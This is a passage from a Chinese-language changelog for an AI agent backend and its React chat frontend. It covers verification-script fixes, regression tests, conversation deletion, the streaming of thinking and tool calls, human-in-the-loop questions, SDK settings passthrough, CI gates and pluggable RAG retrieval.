- **`npm run verify` 补上 `lint:unused`**：README / CONTRIBUTING 一直宣称门禁含死代码检查，而脚本里其实只有 `typecheck + test + test:web + smoke + build + verify:embed`（CI 是**另外**单独跑那一步的）——文档在描述一条不存在的链条。现在脚本与文档一致：`typecheck → lint:unused → test → test:web → smoke → build → verify:embed`。
- **`pipeline.config.json` 的远程声明漂移**：`remotes` 写着 `["origin","cnb"]`，但本仓只配置了 `origin`（CNB）——按原值发版必然卡在「推镜像」那一步失败。现改为实际值，并改掉那条与事实相反的注释（原文断言「origin = GitHub，cnb = CNB」）。

### Added

- **回归测试（改回缺陷即变红）**：文件服务敏感名黑名单（读 / 列表 / 写入）与 `writeBinary` 字节无损、`denyNames` 可覆盖；shell-rules 与审批规则同源且 guard 硬拦集合不变、realpath 链接逃逸；子进程环境裁剪；`isClientMessage` 形态；子代理等待队列上限；Metrics 未知指标名不抛；`deleteByChunkPrefix` 精确匹配（`_` 不是通配符）；向量检索改标题必重算 / 内容未变仍走缓存；单篇文档霸榜时聚合不欠取。
- **`src/sdk-adapter.test.ts`（新测试文件，已登记进 `npm test`）**：锁定适配层的核心契约——形状**对**时取得到、形状**缺失/不对**时返回 `undefined` 而不抛；并锁住 `sdkRenameSession` 的「优先官方 setter、退化到 sessionManager」两条路径。
- **`src/secret-files.ts`**：敏感文件名策略的中性模块，供 HTTP 文件服务与 `guard` 共用（不让扩展层反向依赖 `files/service.ts`）；`files/service.ts` 继续 re-export 原有符号，既有引用与二次开发不受影响。
- **本轮新增回归测试**：guard 钩子拒绝 agent 读写敏感文件（含普通文件与 `read SKILL.md` 白名单不受影响的对照）、root 内符号链接绕过 `denyNames`（读 + 列表预览）、`clientErrorMessage` 脱敏边界、`isDeniedName` 通配与名单契约、MCP 生命周期、sqlite 向量库 `0o600`、设置 `thinkingLevel` 枚举、子代理截断不超上限。`npm test` **364 通过 / 0 失败**（42 个测试文件）。
- **前端首个测试 + 把它接进验证链（`web/src/pi/client.test.ts`，7 个用例）**：覆盖跨会话帧过滤（快照 / 增量 / 流式文本 / 工具轨迹 / run 状态）、切换会话期间只接受目标会话的快照、修订链断裂触发 `get_state` 自愈、快照回填 `streamThinking`、离线 `send` 不改视图且给提示。**不引入任何新依赖**——复用根项目已有的 `tsx --test`，用 `FakeWebSocket` + `location` / `localStorage` 替身驱动（`client.ts` 不依赖 React/DOM）。新增 `npm run test:web` 并纳入 `npm run verify`；`web/tsconfig.test.json` 单独一份（测试要 node 类型，而浏览器 app 引入 node 全局会污染 `setTimeout` 的返回类型），`tsconfig.app.json` 排除 `**/*.test.ts`。
- **原子"替换并重发"：打通官方的编辑与重新生成（`prompt.replaceEntryId`）**：官方 ExternalStore 的 `onEdit` / `onReload` 都要求"替换该消息并**重跑**"，而后端原先无法一次表达这件事——`edit_message` 只把用户消息移出路径、把原文交回输入框（不重发），`rollback_conversation` 又保留该条目。让客户端发两条命令（`edit_message` + `prompt`）拼出来是不安全的：两次之间任何一次失败都会留下**重复的用户消息**。
  现在 `prompt` 增加可选 `replaceEntryId`：在同一个处理函数里先 `editUserMessage`（该用户消息及其后内容离开当前路径）再走正常一轮，**原子**完成；生成中拒绝，非用户消息明确报错。
  前端据此提供 `onEdit`（用官方 `AppendMessage.sourceId`——其类型注释即"The ID of the message that was edited"——定位被编辑的那条）与 `onReload`（官方 `startRun` 的实现是"保留到 `config.parentId` 为止"，所以 `parentId` 就是要重跑的那条用户消息），两者都收敛到 `prompt(replaceEntryId)` 这一个入口。**用户消息编辑与"重新生成"按钮自此可用**；`setMessages` 仍未提供（消息状态的唯一权威是后端快照，让 runtime 往里写会与随后到达的快照冲突），因此**分支切换保持关闭**。
  回归测试：后端 3 例（原子性 / 生成中拒绝且不动树 / 非用户消息报错）+ 前端 1 例（命令必须携带 `replaceEntryId`）。


- **会话真删除（`delete_conversation`）+ 前端批量管理入口**：验收过程中积了几十条测试会话，而现有 `close_conversation` **不是删除**——它先 `rememberConversation` 再 dispose，索引还在，刷新后又是一条磁盘态条目，“关掉又冒出来”。
  - **协议**：`ClientMessage` 新增 `delete_conversation`（同步进 `CLIENT_MESSAGE_TYPES` 完备性断言）。`ws.ts` 单独一个 case，失败**必回 error 帧**（这条会动磁盘，不能静默）。
  - **安全**：删文件前必过 `assertSessionFileAllowed`（与 `openConversation` 同一道闸、同一份 `allowedSessionRoots`，fail-closed）；索引条目缺失时只卸内存，**不猜路径**。约束与 close 对齐：正在生成回复的会话、以及最后一条活会话均拒删。
  - **列表重推**：新增 `ClientSession.refreshConversations()`——删磁盘态条目时本连接内存里没有这个对象，原有路径推不了列表。
  - **前端**：左侧底部新增「批量管理」（多选 + 全选可删 / 只选磁盘态 + 二次确认），当前会话 disabled；官方 `ThreadList` 的 `onDelete` 改接 delete（之前接的是 close，删了会复活）。
  - **一个不接就会抛的坑**：官方条目菜单有 Archive，而 ExternalStore 适配层缺 `onArchive` 时 `runtime.archive()` 直接 `throw new Error("External store adapter does not support archiving")`。后端无归档语义，现映射到 close（从当前列表卸掉、仍可从磁盘重开）。
  - **顺手修掉验收报出的计数不同步**：顶栏“N 个对话”读 `state.conversations`（只随快照刷新），面板读 `conversations` 帧，删完两处差一帧；统一到 `conversations` 单一来源。
  - **验证**：`integration.test.ts` 新增一项（磁盘态条目删除后文件与索引均消失且重推列表；越界路径被拒且**文件与索引都保持原样**；最后一条 / 未知 id / 空 id 均拒），22/22 通过；`npm run verify` 全绿。浏览器实测：37→35 计数联动、确认框文案含“不可恢复”、**F5 后两条未复活**（真删而非卸内存）、未删会话仍可正常打开、控制台零 error/warning。

- **产品前端 `web/`（Vite + React + assistant-ui）**：补齐与后端同源对话 UI。形态是**仓库内独立 npm 项目**（自己的 `package.json` / `tsconfig` / `node_modules`），后端管道（`verify` / Docker / npm 发布）对它零感知；线协议不重建翻译表，`web/tsconfig.app.json` 直接把 `src/protocol.ts` 映射为 `@pi/protocol`，前后端共用同一份类型。
  - **选型**：assistant-ui 自定义后端的四条路里取 **`ExternalStoreRuntime`**——消息权威状态在后端快照里，前端只做翻译与回调转发。`LocalRuntime` 会自己管消息状态、与 snapshot/rollback/fork 语义打架；DataStream 与 AssistantTransport 都要求后端改吐它的线格式，违反“不改后端”。
  - **手写胶水只有两个文件**：`web/src/pi/client.ts`（WS 客户端：`hello`→`ready` 握手、`rev`/`baseRev` 修订链断链自愈、`message_delta` 与快照的归属关系、退避重连）与 `web/src/pi/usePiRuntime.ts`（快照→`ExternalStoreAdapter`，含 `adapters.threadList` 多对话）。控制面（模型/思考档/计划模式/上下文预算）与审批、HITL 反问按官方口径自绘，不走 runtime。
  - **接线**：`src/app.ts` 的 `staticDir` 默认值从已删除的示例页改为 `web/dist`（`express.static` 对不存在目录静默穿透，未构建前端不影响接口）；新增 `ui:dev` / `ui:build` 脚本；Dockerfile 加 `web-builder` 阶段（必须连 `src/protocol.ts` 一起拷，否则前端编译失败）。
  - **验证**：`app.test.ts` 新增 2 项静态挂载契约（显式目录回首页 / 目录不存在时 API 照常且 `GET /` 回 404）；`web/scripts/probe-ws.mjs` 走 Vite 代理跑真实一轮，打印帧序列/流式行数/逐条消息角色与长度/stats；浏览器端到端实测连接、发送、流式逐步增长、中止、Markdown 渲染、多对话切换均无 console error。
  - **实测修正（三轮验收）**：① user 消息不能带 `status`，runtime 硬性禁止，否则抛错并卸载整棵树（现已加 ErrorBoundary 兜住）；② “只调工具的那一轮”在后端快照里就是一条 `len=0` 的 assistant 消息（探针实证：`#0 user len=18 | #1 assistant len=0 | #2 assistant len=34`），所以上轮出现空白气泡——现给“（本轮无文本输出）”占位，这不是渲染缺陷而是协议真实形状；③ 工具属于**运行级**事件且多轮 ReAct 里恰在两轮之间执行，那一刻流式尾消息为空，因此改为独立的运行轨迹条；④ 切/建会话必须同时重置 `rev` **和** `state`，只重置 `rev` 会让新会话的 `snapshot_delta` 跳过链校验、把增量拼到旧会话的 messages 上（消息串会话）。
  - **踩到的坑（已写进 README）**：后端 `originAllowed` 要求 Origin 的 host 等于请求 Host，Vite 代理开 `changeOrigin` 会使浏览器握手被 403、而不带 `Origin` 的脚本客户端却正常——“脚本能连、浏览器不能连”的不对称现象即源于此。
  - **边界（诚实标注）**：审批与反问仍自绘卡片（后端不下发“哪条消息在等审批”的 tool-call 定位信息，官方 `toolApproval` / human tool 通道需要 tool part 归属）。~~工具轨迹快照不持久化~~ 已由后面的“快照携带思维链与工具调用”解决。未接 `onEdit`/`onReload`/`setMessages`（对应 UI 的编辑/重生成/分支自动关闭）：后端 `edit_message` 的语义是“回滚到该条 + 原文交回输入框、不自动再发一轮”，与 assistant-ui 期望的“编辑即新一轮”不等价，硬接会得到与后端会话树不一致的分支。样式层初始为手写的 Tailwind token，现已换用官方 registry 组件与 base-nova 主题（见下条）。

- **快照携带思维链与工具调用（`UiMessage` 扩字段）**：前端“看不到思考过程 / 工具过程、刷新后全没”的根因不在组件库（官方 Reasoning / ToolGroup 一直在），而在**后端没把这些数据交出来**：`projectMessage` 用 `extractText` 只取 `text` parts，把 SDK 已经给到会话里的 `thinking` 与 `toolCall` 全丢了，工具结果则躺在另一条 `toolResult` 消息里从未被归回。
  - **协议**：`UiMessage` 新增可选 `thinking` / `calls` / `stopReason`，并新增 `UiToolCall`（`id`/`name`/`args`/`result`/`isError`/`durationMs`）。全部是**可选字段**，旧客户端不读它们行为逐字不变，故 `PROTOCOL_VERSION` 仍为 1。
  - **投影**：`projectParts` 拆 `thinking`/`toolCall` parts；`currentMessages()` 先扫一遍 `session.messages` 把 `toolResult` 按 `toolCallId` 配成一张表，再归回发起调用的那条 assistant 消息（含 `isError` 与服务端实测的 `durationMs`）。
  - **一个必须注意的正确性点**：工具结果到达时，那条 assistant 消息**已经在上一份快照里发出去了**。若原地改缓存对象，对象引用不变，SnapshotEmitter 的“仅追加”快路径会认为历史未变，新结果永远发不到客户端。所以投影带了一个内容签名（文本/思维链/调用数/已配对数/停止原因/entryId），**签名一变就换新对象**，让增量判定自然失效。`adoptTree`（回退/编辑）与压缩两处缓存重置同步作废。
  - **流式思维链**：以前 `thinking_delta` 只转发不累加，快照的 `streamingMessage` 永远没有思维链；新增 `streamingThinking` 缓冲，与 `streamingText` 同生命周期（`agent_start`/`message_end`/`agent_end` 重置）。
  - **前端**：`convertMessage` 改为从消息自身读 `thinking`/`calls`（刷新后官方区块仍完整），并去掉“（本轮无文本输出）”占位：空内容消息直接不占气泡；`stopReason` 为 `error`/`aborted` 时给可读的失败/中止提示，不再把上游故障说成“模型没说话”；连续多条失败记录只留最新一条。
  - **本轮自己引入又修掉的截断 bug**：`projectMessages` 里流式文本错写成优先取 `state.streamingMessage?.text`（那是**快照生成那一刻**的旧值），把快照之后到达的 `message_delta` 全丢掉了——实测带工具轮的最终答复实时只显示“现在是”，F5 后才是全句。思维链那一行当时写对了（本地优先），文本行写反了。修为两者都以本地累加缓冲为准；不刷新的实时视图与刷新后的文本已逐字等值（codePoint 对比）。
  - **思考档控件**：`ControlBar` 的档位从只读文本改为可选下拉（协议早就有 `set_thinking`）。实测发现不支持 reasoning 的模型会被 SDK 直接回退（请求 `high` 后权威快照仍是 `off`），所以下拉**必须显示服务端回传值**并标注回退，否则用户只会觉得“下拉框坏了”。探针新增 `PI_SET_THINKING` 以验证这件事。
  - **验证**：`integration.test.ts` 新增一项，断言快照里工具轮消息带 `thinking`、`calls[0].args`、配对到的 `result` 与 `durationMs`，且 `toolResult` 不会作为独立消息出现；`npm run verify` 全绿。浏览器实测：思维链与 `1 tool call` 区块均渲染，**F5 刷新后仍完整**，“（本轮无文本输出）”不再出现，无空白气泡，控制台零 error/零 warning。

- **官方 registry 组件与 base-nova 主题接入**：把对话 UI 换为 assistant-ui 官方组件源码（落在本地后归我们自由改），`src/pi/` 适配层一行未动——这正是 ExternalStore 分离的回报。
  - **安装路径**：`npx shadcn@latest init -f -y -b base --no-monorepo --no-reinstall` + `add @assistant-ui/thread @assistant-ui/thread-list`。非交互 shell 里必须把两个回答型旗标都给全（`-f` 答“覆盖 components.json”、`--no-reinstall` 答“是否重装”），否则卡在隐藏提示上；新版 `-b` 是组件库（base/radix/aria）而不是 base color，`-d/--defaults` 会连带把 template 设成 next，不要用。
  - **踩到的 registry 坑（装完是 6 个 TS2307）**：CLI 把文件平铺到 `src/components/`，但组件内部引用同时混用两种基准——`.aui` 文件走 `@/components/assistant-ui/elements/...`，而 `file/image/markdown-text/tooltip-icon-button` 走 `@/components/...`、`image.tsx` 走 `../utils/href`。不能整体搬到一个目录，得按**每个文件自身的 import 行**逐个归位（registry JSON 只声明入口文件，依赖文件的真实路径以代码为准）。Base UI 的 Tooltip 必须有 Provider 祖先，接官方组件时必须在 App 包一层 `TooltipProvider`。
  - **主题去重**：`shadcn init` 是合并而非覆写 `index.css`（自定义的 `--color-ok/--color-warning` 仍然存活），但它自己的 `@theme inline` 在后——Tailwind v4 后声明者胜，所以项目原有的 `--color-background/card/border/...` 全被官方表覆盖。留下“看着在起作用其实不生效”的重复定义比删掉更危险，已只保留官方表没有的两个状态色与 `--font-mono`；Geist 无 CJK 字形，字体栈必须接回系统中文字体。
  - **第二轮验收又挖出两个自己的 bug**：① 消息 id 在流式/定稿之间换身份（流式用位置 id、定稿改用 `entryId`），runtime 把同一条消息当成两条，BranchPicker 出现 `2 / 2`、`3 / 3` 且左右箭头全 disabled 的幻影分支——改为全程用会话内位置 id；② 工具轨迹条写在自己那份 `thread.tsx` 里，接上官方组件后整个文件不再被挂载，轨迹条就静默消失了——上移到 App 层（`pi-panels`），两种 Thread 实现共用；同时删除“按消息归档工具”那套从未产出可见结果的逻辑，并取消 `run_end` 清空轨迹（瞬时工具几毫秒完事，一清就整个人看不见）。
  - **复验（浏览器 DOM 级）**：工具胶囊回复结束后常驻（`● current_time 1ms`，下一轮刷成新轮）、幻影分支 0 个、Tooltip 正常无 provider 报错、提示条实测 9009ms 自动收起、控制台零 error/零 warning。过程中有一轮被**上游模型超时**阻断（`run_end stopReason:"error"`，重试 3 次全败、4 个模型同现），用探针确认自行恢复后重跑，未将上游问题误归因于前端。
  - **逐字节对齐官方发布（新增两个脚本）**：`shadcn add` 会改写 import 路径并把文件平铺，拿 registry 内容作基准一比，实测 17 个文件里只有 6 个完全一致：5 个只差 import 写法，`href.ts` 缺头部注释，`thread-list.aui.tsx` 更是有 Base UI `render` vs 官方 `asChild` 的**组件风味差异**——“样式跟官方一样”不能靠眼看。因此新增：`scripts/sync-official-components.mjs`（按 registry 声明的 path + content 原样重写）与 `scripts/check-registry-sync.mjs`（比对，有修改/缺失则退出码 1），并登记为 `npm run sync:official` / `check:official`。同步后复跑：**一致 17 / 内容不同 0 / 本地缺失 0**（换行归一后比较；CLI 在 Windows 落盘 CRLF，不归一会 15 个全误报）。registry 的依赖有两种形态：绝对 URL（本 registry 的件）与裸名（shadcn 内置件，不属本 registry，只标注不比对）。
  - **会话列表换成官方 ThreadList**：实测 New / 切换 / 搜索过滤均正常，无消息串台。官方按 Today/Yesterday/Earlier 分组不生效——`lastMessageAt` 只在 remote/cloud 线程列表里被装配，`runtimes/external-store` 下 0 处引用，而官方 `useThreadListGroups` 自带“无日期则按 runtime 顺序平铺”的分支，所以平铺就是官方对外部状态主机的正确行为，不是我们的缺失。
  - **工具区块归属修正（官方 ToolGroup 以前从不渲染）**：后端把工具轮存成一条空文本 assistant 消息，而 `tool_status` 到达时该条往往已定稿，原来只挂“流式尾条”的规则使官方 ToolGroup/chain-of-thought 永远收不到 tool part。现按后端真实形状找宿主（优先最后一条空文本 assistant 消息，再退回流式尾条）；复验得到折叠条 `1 tool call` 展开后 `✓ Used tool: current_time`，且该条不再显示“（本轮无文本输出）”占位。另：瞬时工具无 `tool_delta` 输出时 `result` 不能留空，否则官方 ToolFallback 停在“Waiting on tool”并渲染空面板，现填入实际知道的事实（完成与耗时），不假装是工具输出。
  - **上游抖动的处理**：模型侧间歇返回空轮（费用 ¥0.0000、无 tool_status），同一句话重发即可恢复；验收先跑 `probe-ws.mjs` 确认后端能发出 `tool_status` 再去浏览器，避免把上游问题当成前端缺陷。
  - **未改的已知不足**：轮次以 error 结束时，UI 只有“（本轮无文本输出）”，看不出是模型请求失败。没有可用上游就无法验证修改，所以本轮不做无法验证的改动。

- **HITL 反问（`ask_user_question`，走官方 `ctx.ui`）**：补齐"智能体在回合中途向人类发问、阻塞等输入再继续"的能力。**不自己造等待/回收机制**——官方 SDK 原生提供 `ExtensionUIContext`（`ctx.ui.input/select/confirm/editor`，带 `timeout`/`AbortSignal`），但只给 TUI 与 RPC 子进程两种模式配了"谁来回答"；本项目跑进程内 + WS，属官方未附带实现的模式，故补一个 WS 版实现。
  - **桥**：`src/extension-ui-bridge.ts` 逐字复刻官方 `rpc-mode` 的 `createDialogPromise` 语义（`id`→resolver 挂起表、超时/断开/取消一律回官方默认值 undefined/false，**fail-safe 不挂死**，定时器刻意不 unref）；只搬运四类对话框 + notify，其余 TUI 专属方法按官方 RPC 模式降级为 no-op。
  - **协议**：`protocol.ts` 新增 `extension_ui_request`（服务端→客户端）/ `extension_ui_response`（客户端→服务端）两帧，线形逐字对齐官方 `RpcExtensionUIRequest/Response`；同步进内置命令完备性断言。
  - **工具**：`src/tools/ask-user-question.ts` 用 `defineTool` 调 `ctx.ui.*`，`ctx.hasUI` 为假时优雅降级（提示模型改用正常回复收尾），取消/超时返回"未作答"。登记进 `allTools`（三档白名单自动放行 + `human.input` 能力）；`session-hub.ts` 里早已存在的 `ask_user_question` 看门狗豁免占位，至此有了真身。
  - **接线**：`buildAgent({ extensionUi })` 在建会话后用 `extensionRunner.setUIContext(uiContext, "rpc")` 注入（**不用 `session.bindExtensions`——后者每次重放 `session_start` 并跑 `resources_discover`，会给审计/守卫/审批重复触发启动逻辑**）；`server.ts` 建桥 + 延迟广播（同 `approvalSink`）+ 停机 `dispose`；`ws.ts` 加 `notifyUiRequest` 广播 + `case "extension_ui_response"` 路由到 `uiBridge.resolve`。**审批链路一行未动**，二者共用同一等待范式但互不依赖。
  - **验证**：`extension-ui-bridge.test.ts` 10 项单测（应答/id 匹配/取消/超时/断开/回收/notify，改回缺陷即变红）；`smoke` 加 4 项真 WS 闭环（`ctx.ui.input`→广播 `extension_ui_request`→客户端应答→唤醒拿到输入 / 超时回默认 / 未知 id 回提示帧），17→21。`npm run verify` 全绿。
  - **边界**：UI 反问**未做快照持久化**（不像审批把待决卡片存进 `pendingApproval`）：断线重连期间的未答问题靠超时/断开兜底。前端侧已在 `web/` 接上（自绘反问弹窗收发 `extension_ui_request`/`extension_ui_response`，见本轮前端条目）。
- **官方 SDK 能力面补齐（第二轮对照，按 `官方SDK接口文档.md` 逐节实证核对）**：把官方提供、脚手架未接的能力全部补齐。字段名一律以 `dist/*.d.ts` 为准（文档正文的 Settings 字段名与真源有出入，已按真实定义实现）。
  - **SDK 设置透传（A）**：`buildAgent({ sdkSettings })` 把官方 `Settings` 的 `compaction{enabled,reserveTokens,keepRecentTokens}`/`retry{enabled,maxRetries,baseDelayMs}`/`images{autoResize,blockImages}`/`enabledModels` 交给官方 `SettingsManager`（`create`+`applyOverrides`）并注入 `createAgentSession` 与 resource loader，从而真正驱动自动压缩阈值/LLM 重试退避/图像降采屏蔽/模型白名单。**默认不配则不建 SettingsManager、行为逐字不变**。`config.ts` 新增 `resolveSdkSettings`/`resolveExtensionPaths`，由 `PI_COMPACTION_*`/`PI_RETRY_*`/`PI_IMAGES_*`/`PI_ENABLED_MODELS`/`PI_EXTENSION_PATHS` 驱动，server 与 CLI 同源接入。
  - **导入外部会话（B）**：`SessionHub.importConversation()` 用官方 `SessionManager.forkFrom` 把外部 `.jsonl` 完整复制进本脚手架会话目录（生成全新 id）并登记索引，随后走既有 `openConversation` 接回——即官方 CLI/RPC `importFromJsonl` 的底层原语。新增 `POST /sessions/import`。复制出的目标文件同样过 `assertSessionFileAllowed`（fail-closed，与恢复同一道闸）。
  - **官方扩展路径装载（C）**：`buildAgent({ extensionPaths })` → 官方 `additionalExtensionPaths`，与 `extraExtensions` 内联工厂并列的第二条官方路（`noExtensions` 只关 `~/.pi` 扫描，不影响显式路径）。
  - **官方扩展钩子接缝（D/E）**：`src/extensions/provider-hooks.example.ts` 演示 `before_provider_headers`（原地注入头）/ `before_provider_request`（返回替换 payload）；`src/extensions/input-resources.example.ts` 演示 `input`（transform/handled）/ `resources_discover`（运行期动态贡献 skill/prompt 路径）。均默认不接线、类型对齐官方事件、附行为测试。
  - **工具细粒度（F）**：`ask_user_question` 设官方 `executionMode: "sequential"`（HITL 阻塞等人类，不与并发工具抢答）；`renderCall/renderResult` 属 TUI 专属、无头后端不适用（官方 RPC 模式亦降级），故不接。
  - **验证**：`config.test.ts` +4（resolveSdkSettings/resolveExtensionPaths）、`extensions/hooks.example.test.ts` +4（钩子行为）、`sessions/resume.test.ts` +2（导入正/反路径）；`npm run verify` 全链绿（328 测试 / smoke 21/21 / build / 嵌入自检）。
- **官方能力面补齐（对照第三轮）**：
  - **Settings 透传扩面**：`buildAgent({ sdkSettings })` 在上一轮基础上再加 `httpIdleTimeoutMs`（**出站 provider HTTP 空闲超时**，与入站 `hardening.ts` 服务器超时不同）/`websocketConnectTimeoutMs`/`steeringMode`/`followUpMode`/`thinkingBudgets{minimal,low,medium,high}`/`branchSummary{reserveTokens,skipPrompt}`；env 驱动 `PI_HTTP_IDLE_TIMEOUT_MS`/`PI_WS_CONNECT_TIMEOUT_MS`/`PI_STEERING_MODE`/`PI_FOLLOW_UP_MODE`/`PI_THINKING_BUDGET_*`/`PI_BRANCH_SUMMARY_*`；枚举值非法即丢弃。`transport` 因类型不宜校验，暂不接（默认即可）。
  - **`tool_result` 结果脱敏接缝**：`src/extensions/tool-result-redaction.example.ts` 接官方五步管道第 5 步 `tool_result`，在工具结果**回传给模型前**按正则替掉密钥/路径回显（补 `http/errors.ts` 只护 HTTP 响应、管不到发给模型的 tool 结果这一面）。默认不接线、可限定工具白名单、附行为测试。
  - **事件翻译补全**：`auto_retry_end`（官方重试结算事件）之前被 `onEvent` 的 `default` 吐掉，现译成 notice（"重试成功（第 N 次恢复）" / "重试失败：..."）。
  - **文档修正**：`docs/官方SDK接口文档.md` §7 Settings 字段名按 `dist/*.d.ts` 校正（初版凭印象写的 `compaction.threshold`/`retry.maxAttempts`/`images.maxDimension` 等与真源不符，`disabledTools` 实为脚手架自设项），补全真实字段与覆盖状态。
  - **验证**：`config.test.ts` +2（新增字段/枚举校验）、`hooks.example.test.ts` +2（tool_result 脱敏）；已跑 `npm run verify:all`（含真进程 e2e：握手→跑完一轮→SIGKILL→重启恢复→脏索引过滤→工具调用配对恢复）全链绿——**332 测试 / 0 失败 / smoke 21/21 / build / 嵌入自检**。
- **`.cnb.yml`（远端门禁）**：本仓此前**没有任何远端门禁在跑**——`git remote` 只有 `origin`（CNB），而 GitHub Actions 按 `pipeline.config.json` 自己的说明因账号计费锁定无法启动；也就是说前四轮所有加固在合并后都没有自动回归保护。现在 PR 与 `main` 的 push 都会跑：`verify`（含上面那条完整链）、`e2e`（真进程 / 真 SIGKILL / 真重启恢复）、`audit`（高危依赖闸门，钉住公共 registry——部分镜像没实现 advisories 端点会 404 让每次构建都红），以及仅在 `web/**` 或 `src/protocol.ts` 变更时才触发的 `frontend`（lint + build）。前端刻意拆成独立 Pipeline 并用 `ifModify` 收窄触发面：它要装自己那两万多个文件，不该让每个后端 PR 都等它。配置已过流水线校验器（YAML + 语义 + Schema）。
- **`npm run probe:providers` / `npm --prefix web run probe:ws`**：`scripts/probe-providers.mjs` 此前是**没有任何入口**的孤儿脚本（`docs/项目分析报告.md` 自己也把它记为「半废弃」），`web/scripts/probe-ws.mjs` 也只有 `web/README.md` 里的一条裸 `node` 命令。现都补上 npm 入口。
- **回归测试**：第四、五轮每条修复都配了断言——审批非法 `decision` 的 5 种取值（未知 / 空串 / 大小写不符 / `modify` 缺入参 / 合法放行与回传改写）、二次 `hello` 必须卸掉旧会话（`smoke-ws.mjs` 里走**真实 socket** 的断言）、MCP 停机后工具不得复活、并发 `sync` 必须补跑新配置、`estimatedTokens` 确实被采用且与自算同口径、审批策略表上限。后端 376 / 前端 11 / smoke 23。

### Documentation

- **可视化资产与 README 同步**：`generate_architecture.mjs` 补上官方 RPC 入口、检索层、新 env（`PI_SCOPED_MODELS`/`PI_KNOWLEDGE_RETRIEVAL`/`PI_EMBEDDINGS_*`）；新增 `scripts/visualization/generate_retrieval.mjs` → `docs/knowledge-retrieval.svg`（可插拔 RAG 检索管线，后端类名从源码动态读取）；中英 README 架构图注与知识库节同步引用新图，章节结构一一对齐。徽章均为 shields.io 动态端点（版本自动跟随）；SVG 资产英文单版。
- **文档事实性纠错（第五轮，逐条对照源码核过）**：`src/lib.ts` 导出的是 `setupPiAgentDir` 而不是 `setup`（照抄会把嵌入方带偏）；`/agent/health` 被写成「模型 / 技能 / 知识库 / 数据库探活」——那是 `/agent/info`，`/health` 只是存活探针，且 `/agent/health/ready`、`/agent/metrics` 与 `publish.yml` 都未被记录；`docs/前端调研.md` 把并不存在的 `queue_update` 列成服务端推送帧；`.env.example` 漏了 9 个运行时变量（`PI_HOST`、`PI_WS_PATH`、`PI_PROTOCOL_VERSION`、`PI_SNAPSHOT_INTERVAL_MS`、`PI_STREAMING_SNAPSHOT_INTERVAL_MS`、`PI_WS_HEARTBEAT_MS`、`PI_SNAPSHOT_RETRY_MS`、`PI_WS_BACKPRESSURE_BYTES`、`PI_WS_MAX_CONSECUTIVE_DROPS`）；FAQ / SECURITY / `.env.example` 三处都声称 `PI_API_KEY`「运行时不读」，与 `loadEnvFile` 会把整份 `.env` 灌进服务进程的事实相反（真正那道闸是 `child-env.ts` 对子进程的剔除）；各处陈旧的测试计数（中英 README、`docs/能力与边界.md`、`docs/项目分析报告.md`）与 `web/README.md` 的 registry 文件数（17 → 20）一并校正。

## [0.2.0] - 2026-10-09

### Added

- **RAG 可插拔性再补齐（本地 embedding + 持久化向量库 + 官方隔离示例）**：
  - **进程内 embedding（不依赖 Ollama）**：`TransformersEmbeddings`（`PI_EMBEDDINGS_PROVIDER=transformers`）——首次用自动从 HF Hub 下载 ONNX 权重到 `PI_EMBEDDINGS_CACHE_DIR`、进程内跑，含下载/加载/使用/释放。用动态 import + 非字面量模块名，**未装 `@huggingface/transformers` 也不影响 typecheck/默认零依赖**；用到没装才报清晰提示。
  - **sqlite 持久化向量库**：`SqliteVectorStore`（`PI_KNOWLEDGE_VECTOR_STORE=sqlite` + `PI_KNOWLEDGE_VECTOR_DB_PATH`），零新依赖（node:sqlite）；`VectorRetriever` 改用内容寻址 chunk id + `store.has()` 跳过未变条目——**重启不重算 embedding**。
  - **官方隔离姿势示例**：`src/extensions/sandbox.example.ts` 演示用 `pi.registerTool` 覆盖内置 `bash` 把执行路由出宿主（默认不接线）；`guard` 仍为默认软闸门。文档引用官方 `containerization.md`（Docker/Gondolin/OpenShell）。
  - **依赖与一键验证**：`@huggingface/transformers` 列入 `optionalDependencies`（默认会装、装失败不致命，代码仍动态 import）；`TransformersEmbeddings` 支持 `PI_EMBEDDINGS_HF_ENDPOINT`（直连不通时切 hf-mirror 等镜像）；新增 `npm run rag:smoke`——本地进程内 embedding + 向量检索一键实机验证，环境不满足（网络/镜像/原生依赖）时明确 SKIP 并退码 0，不假绿。
- **可插拔知识检索（RAG 入口，按官方姿势）**：官方 SDK 不带 RAG，只规定“你自己 `pi.registerTool` 一个可搜索工具”。把检索后端抽成 `Retriever` 接口：默认 `KeywordRetriever`（进程内关键词、零依赖、行为不变）；`PI_KNOWLEDGE_RETRIEVAL=vector` 启用 `VectorRetriever`（文档切段→embedding→`VectorStore` cosine，按文档聚合）。`EmbeddingProvider` 接口 + `OpenAICompatEmbeddings`（含 Ollama /v1）/`OllamaEmbeddings` 两后端；`VectorStore` 接口默认 `InMemoryVectorStore`，外部 Qdrant/pgvector 实现同接口即可插入。`search_knowledge` 工具与 REST `GET /knowledge/search` 共用同一检索器（单一真源）；`BuiltAgent` 新增 `searchKnowledge()`/`knowledgeRetrieval`。默认关，不影响现有行为。
- **官方 SDK 能力面补齐（对照 API 清单的真差距 + 可选接入）**，全部走官方 API，默认行为不回退：
  - **模型轮换**：`scopedModels`（官方）由 `PI_SCOPED_MODELS` / `buildAgent({ scopedModels })` 配置，缺省用所有已配 Key 模型派生；`session.cycleModel`/`cycleThinkingLevel` 经 CLI `/cycle`、REST `POST /model/cycle`、WS `cycle_model` 暴露。
  - **provider 鉴权状态**：官方 `ModelRuntime.getProviders()` + `checkAuth()` → `BuiltAgent.providerStatus()`；新增 `GET /providers`，`/info` 也带 `providers`（只回 id/name/authorized/来源标签，不回原始 key）。
  - **EventBus**：官方 `createEventBus()` 接入 `DefaultResourceLoader`，`BuiltAgent.eventBus` 暴露给嵌入方。
  - **会话标签**：官方 `SessionManager.appendLabelChange`/`getLabel` 经 WS `set_label` 与快照 `labels` 暴露（UI 书签，与回退的 custom 标记语义不同）。
  - **代码型命令通道**：`src/extensions/example-command.ts` 演示官方 `pi.registerCommand` + `pi.sendUserMessage`（与 `.md` prompt template 并列的官方第二条路；默认不接线）。`sendUserMessage` 是扩展能力、`AgentSession` 不暴露，故不硬造内核命令。
  - **AGENTS.md opt-in**：`buildAgent({ includeAgentsFiles })` 为 true 时取消 `noContextFiles`，让 SDK 以 `<project_context>` 追加项目上下文。默认 false。
  - **自定义 provider 一等参数**：`buildAgent({ providers })` 内部转成 inline 扩展逐顶 `pi.registerProvider`。
